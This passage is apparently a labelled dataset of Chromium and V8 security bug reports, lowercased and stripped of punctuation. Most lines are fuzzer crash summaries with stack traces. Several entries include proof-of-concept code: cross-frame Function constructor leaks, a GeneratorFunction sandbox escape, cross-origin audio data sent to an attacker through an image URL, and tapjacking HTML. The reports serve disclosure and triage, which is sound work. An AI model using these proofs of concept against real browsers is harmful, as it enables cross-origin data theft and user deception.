file the password is the zdi candidate number in the form zdi-can-xxxx where xxxx is the id number please confirm receipt of this report we expect all vendors to remediate zdi vulnerabilities within 120 days of the reported date if you are ready to release a patch at any point leading up the the deadline please coordinate with us so that we may release our advisory detailing the issue if the 120 day deadline is reached and no patch has been made available we will release a limited public advisory with our own mitigations so that the public can protect themselves in the absence of a patch please keep us updated regarding the status of this issue and feel free to contact us at any time zero day initiative zdi-disclosures hp.com the pgp key used for all zdi vendor communications is available from information about the zdi established by tippingpoint and acquired by hewlett-packard the zero day initiative zdi represents a best-of-breed model for rewarding security researchers for responsibly disclosing discovered vulnerabilities the zdi is unique in how the acquired vulnerability information is used the zdi does not re-sell the vulnerability details or any exploit code instead upon notifying the affected product vendor the zdi provides its hp tippingpoint customers with zero day protection through its intrusion prevention technology explicit details regarding the specifics of the vulnerability are not exposed to any parties until an official vendor patch is publicly available disclosure policy our vulnerability disclosure policy is available online at what is the expected behavior what went wrong the full report is above did this work before n/a chrome version chrome 41.0.2249.0 channel n/a os version 8.1 flash version predicted disclosure 05/16/2015	11
assertion failed offset length m_length unknown in blink inlinetextbox constructtextrun detailed report fuzzer bj_broddelwerk job type linux_asan_content_shell_drt crash type unknown crash address crash state blink inlinetextbox constructtextrun blink inlinetextbox positionforoffset blink rendertext localcaretrect regressed minimized testcase 13.97 kb filer inferno	11
unknown in content webcontentsimpl onopencolorchooser detailed report fuzzer ipc_fuzzer_gen job type linux_asan_chrome_ipc_32bit crash type unknown crash address crash state content webcontentsimpl onopencolorchooser bool framehostmsg_opencolorchooser dispatch content webcontentsimpl cont content webcontentsimpl onmessagereceived minimized testcase 1141.73 kb filer inferno	11
bad-cast to blink audionode from invalid vptr audionode.cpp:401:13 detailed report fuzzer mbarbella_js_mutation_layout job type linux_ubsan_vptr_content_shell_drt crash type bad-cast crash address crash state bad-cast to blink audionode from invalid vptr audionode.cpp:401:13 regressed minimized testcase 23.01 kb filer inferno	11
heap-use-after-free in blink workersharedtimer setfireinterval detailed report fuzzer jsbell_serviceworker job type android_asan_chrome crash type heap-use-after-free write 1 crash address crash state blink workersharedtimer setfireinterval blink domtimer stop blink contextlifecyclenotifier notifystoppingactivedomobjects unminimized testcase additional requirements requires http filer inferno	11
use-after-poison in blink calltransactionerrorcallback detailed report fuzzer lcamtuf_cross_fuzz job type linux_asan_chrome_mp crash type use-after-poison read 8 crash address crash state blink calltransactionerrorcallback blink crossthreadtask2 wtf rawptr blink sqltransactionerrorcallback bl blink mainthreadtaskrunner perform regressed minimized testcase 9.90 kb filer inferno	11
heap-use-after-free in bookmarkcontextmenucontroller iscommandidenabled detailed report fuzzer cdiehl_peach job type linux_asan_chrome_media crash type heap-use-after-free read 8 crash address crash state bookmarkcontextmenucontroller iscommandidenabled views menuitemview menuitemview views menuitemview addmenuitemat unminimized testcase additional requirements requires gestures filer aarya	11
heap-use-after-free in blink navigationscheduler shouldschedulenavigation detailed report fuzzer mbarbella_js_mutation_layout job type linux_msan_chrome crash type use-of-uninitialized-value crash address crash state blink frame page blink navigationscheduler schedulelocationchange blink document processhttpequivxframeoptions regressed minimized testcase 0.76 kb filer inferno	11
unknown in destroypropertysheetpage detailed report fuzzer ipc_fuzzer_gen job type windows_asan_chrome_ipc crash type unknown crash address crash state destroypropertysheetpage dpa_merge createpropertysheetpage minimized testcase 333.44 kb filer aarya	11
unknown in content webcontentsimpl onopencolorchooser detailed report fuzzer ipc_fuzzer_gen job type windows_asan_chrome_ipc crash type unknown crash address crash state content webcontentsimpl onopencolorchooser framehostmsg_opencolorchooser dispatch content webcontentsimpl content w content webcontentsimpl onmessagereceived regressed minimized testcase 24912.42 kb filer aarya	11
security blink inadequately whitelists child frames by name in access checks v8 access checks are only used to figure out whether we can look past a specific object for a property blink access checks allow all properties to go through that match the name of a child frame even if loading that name does n't end up actually loading that child frame this is very problematic for multiple reasons in m36 it means that any commonly accessible property via v8window can be used to gain access to any page that would ask the information e.g window.close we just need to install a getter and use caller to get access to the function constructor of the window that tried to call us i m not fully aware what s available on the dom but i presume there are properties apart from window.location that are commonly accessed across iframes in m37 and above this is already mitigated by now allowing to get cross-origin caller stack but it is still problematic since the exploit allows the attacker to mask most common dom properties and hence in case of jsfunction properties intercept their arguments whenever such a value argument or assigned value to a property masked as setter is n't primitive it ll give access to anything in the callers page a sample attack is as follows assume we have a victim page that we know does addeventlistener on some iframe if we manage to navigate that iframe to our attack page containing the following code the victim page indadvertedly leaks a function including function constructor providing entire access to its contents first create a child frame just to unconditionally open up access to addeventlistener iframe name addeventlistener iframe script var p this.__proto var ael addeventlistener put a prototype after the global object since all other versions of addeventlistener live below the child window as well as the original callback mask by our own addeventlistener which in this case passes through the arguments to the original ael this.__proto addeventlistener function console.log arguments arguments 1 constructor is the function constructor for the victim page return ael.apply this arguments proto p script in this case as always to be successful m37 it s actually a bidirectional hazard since the function passed out during addeventlistener leaks the function constructor of the attacker s page allowing the victim to get full access to the attacker s page i m a v8 dev rather than a blink dev so i m not sure i m the best person to fix this both jochen and dcarney are ooo though perhaps haraken should have a look at this	11
unknown in content webcontentsimpl ondidstartloading detailed report fuzzer ipc_fuzzer_gen job type linux_asan_chrome_ipc_32bit crash type unknown crash address crash state content webcontentsimpl ondidstartloading content webcontentsimpl onmessagereceived content webcontentsimpl onmessagereceived regressed minimized testcase 335.46 kb filer inferno	11
heap-use-after-free in blink vectormath vadd detailed report fuzzer mbarbella_js_mutation_layout job type linux_asan_content_shell_drt crash type heap-use-after-free read 16 crash address crash state blink vectormath vadd blink reverbaccumulationbuffer accumulate blink reverbconvolverstage process regressed minimized testcase 6.25 kb filer mbarbella	11
assertion failed positionoffset node length vulnerability details assertion check with security implication is firing with release asan chromium the offset value is 1 but the length of the node is 0 version chrome version 37.0.2045.0 developer build 276470 blink 175949 operating system ubuntu 13.10 x86_64 reproduction case load the following test case head script function dom_manipulation document.execcommand selectall false null document.execcommand removeformat true null script style text-transform uppercase style head body onload='dom_manipulation data data embed embed textarea autofocus 329 textarea for crashes please include the following additional information type of crash tab sigbjornf is added to cc list since he changed the firing assertion to security assertion in r171165 backtrace assertion failed positionoffset node length third_party/webkit/source/core/editing/frameselection.cpp 397 webcore position webcore updatepositionafteradoptingtextreplacement const webcore position webcore characterdata unsigned int unsigned int unsigned int 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 asan sigsegv 16941==error addresssanitizer segv on unknown address pc sp bp t31 0 in updatepositionafteradoptingtextreplacement b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/editing/frameselection.cpp:397 discriminator 2 1 in didupdatecharacterdata b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/editing/frameselection.cpp:410 2 in setdataandupdate b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/characterdata.cpp:184 3 in deletedata b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/characterdata.cpp:134 4 in inserttext1andtrimtext2 b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/editing/splittextnodecommand.cpp:103 5 in doapply b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/editing/splittextnodecommand.cpp:67 6 in applycommandtocomposite b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/editing/compositeeditcommand.cpp:246 7 in splittextnode b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/editing/compositeeditcommand.cpp:440 8 in splittextatend b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/editing/applystylecommand.cpp:1211 9 in applyinlinestyle b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/editing/applystylecommand.cpp:588 10 in doapply b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/editing/applystylecommand.cpp:214 11 in applycommandtocomposite b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/editing/compositeeditcommand.cpp:246 12 in doapply b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/editing/removeformatcommand.cpp:96 13 in apply b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/editing/compositeeditcommand.cpp:205 14 in removeformattingandstyle b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/editing/editor.cpp:578 15 in executeremoveformat b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/editing/editorcommand.cpp:973 16 in execute b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/editing/editorcommand.cpp:1687 17 in execcommand b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/document.cpp:4360 18 in execcommandmethod b/build/slave/asan_release__symbolized_/build/src/out/release/gen/blink/bindings/core/v8/v8document.cpp:5008 19 in execcommandmethodcallback b/build/slave/asan_release__symbolized_/build/src/out/release/gen/blink/bindings/core/v8/v8document.cpp:5014 20 in call b/build/slave/asan_release__symbolized_/build/src/out/release v8/src/arguments.cc:33 21 in handleapicallhelper false b/build/slave/asan_release__symbolized_/build/src/out/release v8/src/builtins.cc:1208 22 in builtin_handleapicall b/build/slave/asan_release__symbolized_/build/src/out/release v8/src/builtins.cc:1224	11
unsafe generatorfuntion intrinsic can not be denied this template is only for reporting security bugs please use a different template for other types of bug reports please see the following link for instructions on filing security bugs vulnerability details this is a resubmission of undisclosed and fixed-at-head v8 bug which says the short form function constructor yield window next value the window please cc kpreid google.com on this bug as shown at jorendorff/figure-2.png the generatorfunction intrinsic and the generator intrinsic initially point at each other generator constructor is initially generatorfunction and generatorfunction prototype is initially generator section 25.2.3.1 of jorendorff/es6-draft.html sec-generatorfunction.prototype.constructor says the initial value of generatorfunction.prototype.constructor is the intrinsic object generatorfunction this property has the attributes writable false enumerable false configurable true i checked the latest draft at and this section is unchanged this means that an object.defineproperty generator constructor value somethingelse should change generator constructor to be somethingelse unfortunately on v8 checked both chrome 41 beta and chrome 42 canary with the experimental javascript flag turned on this property has attributes writable false enumerable false configurable false and indeed as that implies its value can not be changed changing the value of this property is absolutely essentially to the security of caja and ses and of those google properties that rely on it currently these google properties are fully vulnerable and knowledge of this attack should be treated according to responsible disclosure principles the undisclosed caja bug for tracking this is please let me know if you d like access why is this fatal the real generatorfunction like the initial function constructor or the initial eval function provides unconditional access to the global object of that realm the security of caja and ses depends on being able to hide these objects from confined code it depends on much else as well but these are necessary conditions some of the intrinsics are what we call undeniables for example the original function.prototype is undeniable since any function expression evaluates to a new function which inherits from it independent of any other consideration however ses still denied access to the original function constructor by setting function.prototype.constructor to point at fakefunction see 1018 likewise in v8 or any other browser that has implemented es6 generators generator is undeniable because any function expression inherits from it in order for ses to still deny access to generatorfunction it needs to change generator constructor to point at a fakegeneratorfunction we have an undisclosed cl that does exactly this and works on all the other browsers we tested on except opera of course please let me know if you d access to this cl fortunately the v8 bug can be quietly fixed apparently just to conform to the spec without the fix itself calling attention to the existence of this vulnerability unfortunately the same can not be said of the caja cl there s no way to upgrade caja to seal off generatorfunction without making clear that it is currently exposed assuming no one else discovers this attack and we obtain no evidence it is being exploited we will need to keep all of these private until the v8 fix rolls out in a chrome release and the fix to caja then gets rolled out in those google properties that rely on it my apologies to all for not having noticed this vulnerability earlier thanks version tested on 41.0.2272.53 beta 64-bit and 42.0.2308.0 canary 64-bit reproduction case function fakegeneratorfunction object.defineproperty function proto constructor value fakegeneratorfunction should have worked uncaught typeerror can not redefine property constructor function proto__.constructor fakegeneratorfunction should be true false function constructor yield window next value window should throw must not succeed with true true just verified that ff does indeed give the correct responses to the code above for crashes please include the following additional information na	11
heap-use-after-free in content messageportservice updatemessageport detailed report fuzzer ipc_fuzzer_gen job type linux_asan_chrome_ipc crash type heap-use-after-free read 8 crash address crash state content messageportservice updatemessageport content messageportmessagefilter updatemessageportswithnewroutes content webcontentsimpl routemessageevent unminimized testcase filer inferno	11
undefined behavior bad virtual call in net/socket/ssl_client_socket_pool.cc useragent mozilla/5.0 x11 linux x86_64 applewebkit/537.36 khtml like gecko chrome/40.0.2214.93 safari/537.36 steps to reproduce the problem 1 run an instrumented net_unittests what is the expected behavior what went wrong the function sslconnectjob dotunnelconnectcomplete in net/socket/ssl_client_socket_pool.cc static_casts a streamsocket object to httpproxyclientsocket in order to call getconnectresponseinfo on it however it is possible for the streamsocket to be a spdyproxyclientsocket thus causing the call to invoke undefined behavior it looks like we can solve this problem by casting to proxyclientsocket instead did this work before n/a chrome version trunk channel dev os version flash version this result is from a new compiler instrumentation i am working on that dynamically verifies that virtual calls are made using objects of the correct type	11
use-after-free in blink axspinbutton elementrect detailed report fuzzer inferno_twister job type windows_syzyasan_content_shell crash type use-after-free read 1 crash address crash state blink axspinbutton elementrect blink webaxobject boundingboxrect content webaxobjectproxy x regressed minimized testcase 9.19 kb filer mbarbella	11
heap-buffer-overflow in cpdf_sampledfunc v_call detailed report uploader mjurczyk google.com job type linux_asan_pdfium crash type heap-buffer-overflow read 1 crash address crash state cpdf_sampledfunc v_call cpdf_function call cpdf_separationcs getrgb unminimized testcase filer mjurczyk	11
use-of-uninitialized-value in blink font glyphdataandpageforcharacter detailed report fuzzer miaubiz_css_fuzzer job type linux_msan_chrome crash type use-of-uninitialized-value crash address crash state blink font glyphdataandpageforcharacter unsigned int blink simpleshaper advanceinternal blink latin1textiterator blink simpleshaper advance minimized testcase 9.29 kb filer inferno	11
use-of-uninitialized-value in skpath arcto detailed report fuzzer inferno_canvas_wrecker job type linux_msan_chrome crash type use-of-uninitialized-value crash address crash state skpath arcto blink canvaspathmethods arcto blink canvasrenderingcontext2dv8internal arctomethodcallback minimized testcase 4.61 kb filer inferno	11
use-of-uninitialized-value in ucase_toupper_52 detailed report fuzzer bj_broddelwerk job type linux_msan_chrome crash type use-of-uninitialized-value crash address crash state ucase_toupper_52 blink font glyphdataandpageforcharacter unsigned int blink simpleshaper advanceinternal blink latin1textiterator minimized testcase 4.32 kb filer inferno	11
security denial of service attack against third-parties using web sockets vulnerability details it is possible to trigger a high amount of connections from the client to third party domains by using web sockets this happens when the user navigates to another page version chrome version 39.0.2171.95 m stable and chromium 41.0.2226.0 operating system windows 7 enterprise service pack 1 64-bit reproduction case the index.html page is a malicious page making the browser open a high amount of connections to another domain 192.168.88.252 although the connections are kept under control when the user is visiting the malicious page the moment when the user clicks on the link to go to google.com the amount of connections on the attacked server 252 goes up immediately sometimes up to 400 connections are observed if the user closes the tab this also happens however if the browser is closed or if the page opened after the malicious page is not loaded this behavior the attack does n't work this seems to happen in mac os also but not in ubuntu systems	11
security midihostmsg_senddata vector oob on android midihostmsg_senddata is handled in content/browser/media/midi_host.cc:90 void midihost onsenddata uint32 port midi_manager dispatchsendmididata this port data timestamp midimanager implementation on android at media/midi/midi_manager_usb.cc:42 does void midimanagerusb dispatchsendmididata midimanagerclient client uint32_t port_index dcheck_lt port_index output_streams_.size output_streams port_index send data where output_streams is a scopedvector usbmidioutputstream port_index is controlled by a compromised renderer and is only validated by a dcheck only the android implementation of midimanager lacks validation other platforms seem to be good version chrome version m40 stable m41 beta operating system android reproduction case from the renderer send new midihostmsg_senddata 2 data 0 poc renderer patch is attached build android release content shell and run i tested it with tot 598c3e9b0e	11
pwn2own gpu bug buffer overflow via race condition src/gpu/command_buffer/service/gles2_cmd_decoder.cc error error gles2decoderimpl handlegetuniformfv uint32 immediate_data_size const v oid cmd_data const gles2 cmds getuniformfv c static_cast const gles2 cmds getuniformfv cmd_data gluint program c.program glint fake_location c.location gluint service_id glint real_location 1 error error typedef cmds getuniformfv result result result result glenum result_type if getuniformsetup program fake_location c.params_shm_id c.params_shm_offset error real_location service_id reinterpret_case void result result_type if result_type gl_bool result_type gl_bool_vec2 result_type g l_bool_vec3 result_type gl_bool_vec4 glsizei num_values result getnumresults scoped_ptr glint temp new glint num_values glgetuniformiv service_id real_location temp.get glfloat dst result getdata for glsizei ii 0 ii num_values i dst ii temp ii 0 else glgetuniformfv service_id real_location result getdata return error specifically the following code is buggy glsizei num_values result getnumresults getnumresults function simply returns result size which is validated and determined by getuniformsetup however the result is located in shared memory so even if getuniformsetup validated the size result size can be manipulated afterwards to cause an overflow	11
security cross-origin information disclosure through createmediaelementsource and offlineaudiocontext vulnerability details an attacker may read an audio file or a conversion of that file to an audio buffer overriding cross origin checks this for example may allow sending to the attacker the contents of a file stored on the local machine or on the intranet to a remote computer version chrome version 30.0.1599.114 stable 30.0.1599.101 m operating system linux ubuntu 12.10 64bit windows 7 vm reproduction case to reproduce with javascript 1 create an audio element 2 set its source to a media file on a different origin i.e different domain than the executing file 3 create a webkitofflineaudiocontext context 4 on the context call createmediaelementsource of the audio element creating a source node 5 connect the source node to the context.destination 6 play the audio and start rendering the context 7 when rendering is done send the rendered output buffer to the attacker a similar vulnerability can be achieved by using webkitaudiocontext and a scriptproccessor node to collect the data from the mediaelementaudiosource node did not find or looked for a way to escalate this vulnerability beyond valid media files following is a javascript reproduction of this change the src to a valid audio file src start script var src var samplerate 44100.0 var lengthinseconds 2 var context null audio null source null var actualbuffer null context new webkitofflineaudiocontext 2 samplerate lengthinseconds samplerate var audio document.createelement audio audio.src src var source context.createmediaelementsource audio source.connect context.destination audio.addeventlistener playing function e console.log playing e context.startrendering context.oncomplete function e console.log e.renderedbuffer just a demonstration of sending the data sending the second sample var img document.createelement img img.src e.renderedbuffer.getchanneldata 0 1 document.body.appendchild img audio.play end script	5
security unknown in renderframeimpl onmessagereceived version chrome version 43.0.2313.0 canary operating system windows 7 reproduction case actually this issue needs several attempts for repro the crash i uploaded a video for see how i repro it but i m looking for another way to repro it easily crash id a20a8abec387eccc 206d3cf668db709e c7967da3ee8b4998 eax=88ef4125 ebx=0890b400 ecx=2541e630 edx=001cf5a4 esi=0738eb50 edi=0890b400 eip=0f458e67 esp=001cf2e0 ebp=001cf62c iopl=0 nv up ei ng nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010286 chrome_child content renderframeimpl onmessagereceived 0f458e67 ff5064 call dword ptr eax+64h ds:0023:88ef4189 0:000 k stack trace for last set context thread/.cxr resets it childebp retaddr 001cf62c 0f414a39 chrome_child content renderframeimpl onmessagereceived c b\build\slave\win\build\src\content\renderer\render_frame_impl.cc 950 001cf63c 0f414a11 chrome_child content messagerouter routemessage c b\build\slave\win\build\src\content\common\message_router.cc 55 001cf648 0f3870a6 chrome_child content messagerouter onmessagereceived c b\build\slave\win\build\src\content\common\message_router.cc 47 001cf6d8 0f386fe3 chrome_child content childthreadimpl onmessagereceived c b\build\slave\win\build\src\content\child\child_thread_impl.cc 545 001cf70c 0f386f48 chrome_child ipc channelproxy context ondispatchmessage c b\build\slave\win\build\src\ipc\ipc_channel_proxy.cc 283 001cf71c 0f385a56 chrome_child base internal invoker indexsequence 0,1 base internal bindstate base internal runnableadapter void thiscall content inputeventfilter ipc message const void cdecl content inputeventfilter ipc message const base internal typelist content inputeventfilter ipc message base internal typelist base internal unwraptraits content inputeventfilter base internal unwraptraits ipc message base internal invokehelper 0 void base internal runnableadapter void thiscall content inputeventfilter ipc message const base internal typelist content inputeventfilter const ipc message const void cdecl void run c b\build\slave\win\build\src\base\bind_internal.h 346 001cf794 0f3f29fe chrome_child base debug taskannotator runtask c b\build\slave\win\build\src\base\debug\task_annotator.cc 63 001cf7e0 0f3f2554 chrome_child content taskqueuemanager processtaskfromworkqueue c b\build\slave\win\build\src\content\renderer\scheduler\task_queue_manager.cc 419 001cf804 0f3f24c2 chrome_child content taskqueuemanager dowork c b\build\slave\win\build\src\content\renderer\scheduler\task_queue_manager.cc 389 001cf818 0f3f2483 chrome_child base internal invokehelper 1 void base internal runnableadapter void thiscall content taskqueuemanager bool base internal typelist base weakptr content taskqueuemanager const bool const makeitso c b\build\slave\win\build\src\base\bind_internal.h 303 001cf82c 0f385a56 chrome_child base internal invoker indexsequence 0,1 base internal bindstate base internal runnableadapter void thiscall content taskqueuemanager bool void cdecl content taskqueuemanager bool base internal typelist base weakptr content taskqueuemanager bool base internal typelist base internal unwraptraits base weakptr content taskqueuemanager base internal unwraptraits bool base internal invokehelper 1 void base internal runnableadapter void thiscall content taskqueuemanager bool base internal typelist base weakptr content taskqueuemanager const bool const void cdecl void run c b\build\slave\win\build\src\base\bind_internal.h 346 001cf8a4 0f3856db chrome_child base debug taskannotator runtask c b\build\slave\win\build\src\base\debug\task_annotator.cc 63 001cf8dc 0f38552d chrome_child base messageloop runtask c b\build\slave\win\build\src\base\message_loop\message_loop.cc 451 001cf9e8 0f387a06 chrome_child base messageloop dowork c b\build\slave\win\build\src\base\message_loop\message_loop.cc 571 001cfa14 0f3851b2 chrome_child base messagepumpdefault run c b\build\slave\win\build\src\base\message_loop\message_pump_default.cc 33 001cfa38 0f3850ba chrome_child base messageloop runhandler c b\build\slave\win\build\src\base\message_loop\message_loop.cc 415 001cfa60 0f386624 chrome_child base runloop run c b\build\slave\win\build\src\base\run_loop.cc 56 001cfa84 0f3d8e5c chrome_child base messageloop run c b\build\slave\win\build\src\base\message_loop\message_loop.cc 308 001cfc24 0f37e265 chrome_child content renderermain c b\build\slave\win\build\src\content\renderer\renderer_main.cc 221 001cfc38 0f37e1e1 chrome_child content runnamedprocesstypemain c b\build\slave\win\build\src\content\app\content_main_runner.cc 385	11
heap-buffer-overflow in blink webstring fromutf8 running chromium with no-sandbox reproduces the issue vulnerability details 6700==error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 4 at thread t0 0304/012123 error client_util.cc 258 could not find exported function relaunchchromebrowserwithnewcommandlineifneeded 0 in wtf string fromutf8 c b\build\slave\win_asan_release\build\src\third_party\webkit\source\wtf\text\asciifastpath.h:91 1 in blink webstring fromutf8 c b\build\slave\win_asan_release\build\src\third_party\webkit\source\wtf\text\wtfstring.h:392 2 in gpu_blink webgraphicscontext3dimpl getactiveuniform c b\build\slave\win_asan_release\build\src\gpu\blink\webgraphicscontext3d_impl.cc:403 3 in blink webglrenderingcontextbase getactiveuniform c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\html\canvas\webglrenderingcontextbase.cpp:2117 4 in blink v8setreturnvalue v8 functioncallbackinfo v8 value blink webglactiveinfo c b\build\slave\win_asan_release\build\src\out\release\gen\blink\bindings\core\v8\v8webglrenderingcontext.cpp:1826 5 in blink autocompleteerrorevent create c b\build\slave\win_asan_release\build\src\out\release\gen\blink\bindings\core\v8\v8webglrenderingcontext.cpp:1832 6 in v8 internal functioncallbackarguments call c b\build\slave\win_asan_release\build\src\v8\src\arguments.cc:33 7 in v8 internal builtins invokeapifunction c b\build\slave\win_asan_release\build\src\v8\src\builtins.cc:1077 8 in v8 internal builtins builtins c b\build\slave\win_asan_release\build\src\v8\src\builtins.cc:1100 is located 0 bytes to the right of 1-byte region allocated by thread t0 here 0 in malloc c b\build\slave\win_asan_release\build\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_malloc_win.cc:58 1 in operator new f dd\vctools\crt\crtw32\heap\new.cpp:59 2 in gpu_blink webgraphicscontext3dimpl getactiveuniform c b\build\slave\win_asan_release\build\src\gpu\blink\webgraphicscontext3d_impl.cc:390 3 in blink webglrenderingcontextbase getactiveuniform c b\build\slave\win_asan_release\build\src\third_party\webkit\source\core\html\canvas\webglrenderingcontextbase.cpp:2117 4 in blink v8setreturnvalue v8 functioncallbackinfo v8 value blink webglactiveinfo c b\build\slave\win_asan_release\build\src\out\release\gen\blink\bindings\core\v8\v8webglrenderingcontext.cpp:1826 5 in blink autocompleteerrorevent create c b\build\slave\win_asan_release\build\src\out\release\gen\blink\bindings\core\v8\v8webglrenderingcontext.cpp:1832 6 in v8 internal functioncallbackarguments call c b\build\slave\win_asan_release\build\src\v8\src\arguments.cc:33 7 in v8 internal builtins invokeapifunction c b\build\slave\win_asan_release\build\src\v8\src\builtins.cc:1077 8 in v8 internal builtins builtins c b\build\slave\win_asan_release\build\src\v8\src\builtins.cc:1100 summary addresssanitizer heap-buffer-overflow c b\build\slave\win_asan_release\build\src\third_party\webkit\source\wtf\text\asciifastpath.h:91 wtf string fromutf8 version chrome version version 43.0.2321.0 asan-win32-release-318863 operating system windows i have also tested this to work with linux 64bit	11
security cross-page and cross-domain propagation of click events on mobile devices vulnerability details on mobile versions of chrome under ideal circumstances click events can fire in a context different to where they were initially triggered this is achieved by utilizing touch events on a trigger page and click events on a victim page the trigger page utilizes the ontouchstart event handler to redirect to the victim page where a click event can be fired either within the same domain or across domain/same origin boundaries this is a similar class of vulnerability to clickjacking on desktop however i d classify this differently as the click event should not be propagating to the next page loaded i d describe it as tapjacking this click also fires in the exact same location as the original tap so you can use this to target specific elements on a victim page version chrome version chrome 37.0.2062.117 operating system android 4.4.4 build ktu84p nexus 5 reproduction case please find at the foot of this report two html snippets trigger.html upload this to one location victim.html upload this to a location on another server to show cross-domain propagation this vulnerability relies on the fact that both touch and click events fire on mobile devices when the user taps a screen you ll see ontouchstart ontouchend and a click this vulnerability relies on the interaction being detected as a tap when the div on the trigger.html tag is tapped the user is redirected to the victim page you ll need to update the js here to point to the url in your environment after the subsequent page has loaded if conditions are just right you ll see the click handler on victim.html has fired and displayed an alert i found this to be reproducible nearly 100 of the time but i m biased the only instances i found this is n't reproducible is if you tap too fast/slow or pageload is delayed so timing is a big factor here like clickjacking this could have performed an action on the behalf of a user on another site exploitability what i ve supplied is intentionally not targeted to any specific application this could be extended to target specific buttons which require only single clicks to perform actions buy this post that email this the idea would be to utilise the trigger as a deceptive landing page to trigger a typically user initiated event by knowing the location on-screen of the element and encouraging the user to tap on the location id be happy to assist in further investigations here kind regards matt trigger.html html head title tapjacking trigger title script function redirect window.location change me script head body div style width 100 height 100 background-color pink ontouchstart redirect tap anywhere in the pink box div body html victim.html html head title tapjacking victim title head body div style width 100 height 100 background-color green onclick alert at victim nbsp div body html	9
oob write in v8 due to elements kind confusion chrome version 42.0.2311.0 developer build 64-bit urls if applicable other browsers tested add ok or fail after other browsers where you have tested this issue safari 7.1.3 ok firefox 35.0.1 ok ie 7/8/9/10 n/a what steps will reproduce the problem 1 turn on a specific graphics feature section plane view in our webgl-based software www.onshape.com 2 manipulate the view rotate the camera etc 3 shortly after sometimes an aw snap tab crash will happen what is the expected result tab does n't crash what happens instead tab crashes aw snap please provide any additional information below attach a screenshot if possible i apologize that this report does not include solid repro steps this is a rare crash that feels like a race condition and occurs perhaps 1 of 5-10 times a specific visualization mode is used unfortunately the software itself www.onshape.com is also closed for a little while longer but if anyone would like to work on this bug i can provide an invitation this bug appears on mac and windows in the latest chrome and chromium i have managed to trap the crash in xcode in a debug chromium build it appears that somehow the internal v8 javascript function handle for the requestanimationframe callback becomes null i have seen it crash the same way twice in the debugger the crash is definitely triggered by a specific webgl graphics feature section view that shows a cutaway of the model though the causal link there is mysterious i have attached a screenshot of the debugger stopped at the offending line the about version information is chromium 42.0.2311.0 developer build 64-bit revision ca068183ed1ef472599cbd1acb69d954d7a3b635-refs/heads/master 317350 os mac os x blink 537.36 190452 javascript v8 4.2.77 flash disabled user agent mozilla/5.0 macintosh intel mac os x 10_9_5 applewebkit/537.36 khtml like gecko chrome/42.0.2311.0 safari/537.36 command line users/fcole/chromium/src/out/debug/chromium.app/contents/macos/chromium disable-background-networking disable-client-side-phishing-detection disable-component-update disable-default-apps disable-hang-monitor disable-prompt-on-repost disable-sync disable-web-resources enable-logging ignore-certificate-errors ignore-gpu-blacklist enable-logging v=1 load-extension=/var/folders/pf/llj71sj90r30369h0pnfgrn40000gn/t/.org.chromium.chromium.sc8vm8/internal log-level=0 metrics-recording-only no-first-run password-store=basic remote-debugging-port=12997 safebrowsing-disable-auto-update safebrowsing-disable-download-protection test-type=webdriver use-mock-keychain user-data-dir=/var/folders/pf/llj71sj90r30369h0pnfgrn40000gn/t/.org.chromium.chromium.flrnzy enable-avfoundation flag-switches-begin flag-switches-end data executable path users/fcole/chromium/src/out/debug/chromium.app/contents/macos/chromium profile path private/var/folders/pf/llj71sj90r30369h0pnfgrn40000gn/t/.org.chromium.chromium.flrnzy/default variations infinitecache no prerender prerenderenabled	11
heap-use-after-free in blink mutationobserverregistration unregister vulnerability details chrome-heap-use-after-free-blinkmutationobserverregistrationunregister that crashes on 20307==error addresssanitizer heap-use-after-free on address at pc bp sp version chrome version 42.0.2276.0 dev operating system mac os x reproduction case open attached minimized test case poc.html for crashes please include the following additional information type of crash tab crash state asanlog.txt	11
security hsts not applied to websocket vulnerability details the script in the attached poc.html uses the websocket api to make an insecure plain http request to accounts.google.com verification that the insecure request is made can be accomplished easily by capturing traffic locally with wireshark accounts.google.com has hsts configured on it to only use https and is even in the hsts pre-load list although being in the pre-load list does not matter for this bug as it affects non-pre-loaded sites as well this means that hsts policy is not being applied to websocket requests and leaves users open to ssl stripping cookie forcing etc i believe that firefox handled this issue with mentioned in that link someone said that this was handled in chromium by but in the almost four years since then this seems to have been undone or it was n't actually handled version chrome version 40.0.2214.95 stable operating system ubuntu linux 14.04.1 lts reproduction case begin capturing traffic locally and then open the attached poc.html into an affected version of chrome you ll see the non-tls traffic including non-secure cookies etc in the packet capture	4
